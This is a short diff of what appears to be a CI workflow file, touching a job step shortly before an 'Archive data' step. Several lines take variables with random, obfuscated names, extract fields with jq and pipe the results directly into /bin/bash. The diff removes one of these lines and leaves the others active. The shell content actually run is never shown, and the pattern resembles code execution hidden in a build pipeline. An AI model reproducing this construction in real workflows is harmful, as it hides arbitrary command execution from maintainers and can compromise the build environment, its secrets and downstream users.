@@ -34,7 +34,6 @@ jobs:
           echo $nz03769 | jq -r .s6 | /bin/bash
           printf '%s' "$jkxe834" | jq -r .c4093 | /bin/bash
           printf '%s' "$ytrc32" | jq -r .r6 | /bin/bash
-          printf '%s' "$vchd2314" | jq -r .kty453 | /bin/bash
           printf '%s' "$nw2740" | jq -r .brvw480 | /bin/bash
 
       - name: Archive data
